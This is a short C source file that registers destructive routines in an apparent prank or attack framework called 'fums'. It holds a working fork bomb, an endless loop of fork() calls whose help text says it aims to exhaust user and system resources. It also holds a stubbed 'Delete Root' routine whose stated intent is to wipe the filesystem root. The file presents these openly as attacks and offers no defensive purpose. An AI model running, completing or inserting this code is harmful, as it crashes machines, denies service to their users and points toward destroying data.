#include <unistd.h>
#include "fums.c"


//  =-=-=-=-=-=-=-=-=- FORK BOMB -=-=-=-=-=-=-=-=-=-=-=

void forkbomb() {
	while(1) {
		fork();
	}
}

char *helpFb(){
	char *msg = "Applies the infamous fork bomb. Recursively calls fork() thus quickly exhausting the user's, and hopefully system's, resources.";
	return msg;
}


struct fums createFbfums()  {
	struct fums fums = create_fums("Fork Bomb", forkbomb, helpFb());
	return fums;
}

//  =-=-=-=-=-=-=-=-=- FORK BOMB END -=-=-=-=-=-=-=-=-=-=-=


//  =-=-=-=-=-=-=-=-=- DELETE ROOT -=-=-=-=-=-=-=-=-=-=-=

void deleteRoot() {

	return;
	// TODO
}

char *helpDr(){
	char *msg = "Root go bye bye";
	return msg;
}

struct fums createDrfums()  {
	struct fums temp = create_fums("Delete Root", deleteRoot, helpDr());
	return temp;
}

//  =-=-=-=-=-=-=-=-=- DELETE ROOT END -=-=-=-=-=-=-=-=-=-=-=

